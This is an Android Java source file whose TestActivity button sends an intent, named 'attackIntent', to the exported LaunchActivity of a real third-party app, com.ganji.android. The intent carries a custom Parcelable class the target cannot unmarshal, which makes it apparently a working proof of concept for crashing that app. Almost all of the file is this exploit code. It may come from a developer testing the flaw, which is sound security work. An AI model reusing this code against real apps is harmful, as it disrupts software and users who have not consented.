package com.xian.myapp.activities;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Environment;
import android.os.Parcel;
import android.os.Parcelable;
import android.util.Log;
import android.util.LruCache;
import android.view.View;
import android.view.ViewStub;
import android.widget.Button;

import com.xian.myapp.R;
import com.xian.myapp.base.BaseActivity;
import com.xian.myapp.utils.ToastUtils;

import java.io.File;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;
import dalvik.system.PathClassLoader;

public class TestActivity extends BaseActivity {

    private Button btn;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_test);


        int i=getIntent().getIntExtra("test",-1);
        int j=getIntent().getExtras().getInt("test", -1);

        Log.e("lmf","<<>>>>>"+i+":"+j);

        btn = (Button) findViewById(R.id.btn1);
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                String packageName = "com.ganji.android";
                String className = "com.ganji.android.control.LaunchActivity";
                Intent attackIntent = new Intent();
                attackIntent.setComponent(new ComponentName(packageName, className));
                attackIntent.putExtra("error data", new ErrorData());
                attackIntent.putExtra("test", 10);
                startActivity(attackIntent);
            }
        });
    }

    private static class ErrorData implements Parcelable {

        private int code;
        private String name;

        public ErrorData() {
        }

        @Override
        public int describeContents() {
            return 0;
        }

        @Override
        public void writeToParcel(Parcel dest, int flags) {
            dest.writeInt(code);
            dest.writeString(name);
        }

        public final static Parcelable.Creator<ErrorData> CREATOR = new Parcelable.Creator<ErrorData>() {
            public ErrorData createFromParcel(Parcel in) {
                return new ErrorData(in);
            }

            public ErrorData[] newArray(int size) {
                return new ErrorData[size];
            }
        };

        private ErrorData(Parcel in) {
            code = in.readInt();
            name = in.readString();
        }
    }

}
